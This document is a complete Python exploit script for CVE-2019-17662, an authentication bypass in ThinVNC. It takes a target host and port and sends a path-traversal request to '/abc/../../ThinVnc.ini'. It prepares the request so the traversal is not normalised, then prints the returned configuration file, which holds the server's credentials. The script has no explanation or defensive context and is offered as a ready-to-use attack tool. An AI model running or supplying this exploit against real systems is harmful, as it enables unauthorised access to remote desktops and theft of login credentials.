#!/usr/bin/python3

import requests
import argparse
import sys

parser = argparse.ArgumentParser(description = "CVE-2019-17662: ThinVNC Auth Bypass")
parser.add_argument('-t', '--host', help="to specifiy target host")
parser.add_argument('-p', '--port', help="to specifiy target port")
args = parser.parse_args()

if len(sys.argv) == 1:
	parser.print_help(sys.stderr)
	sys.exit(1)

host = args.host
port = args.port

# change the protocol for https site
target_url = f"http://{host}:{port}/abc/../../ThinVnc.ini"
print("[*] Fetching ThinVnc.ini File\n")
s = requests.Session()
req = requests.Request(method="GET", url=target_url)
prep = req.prepare()
prep.url = target_url

r = s.send(prep, verify=False)
print(r.text)
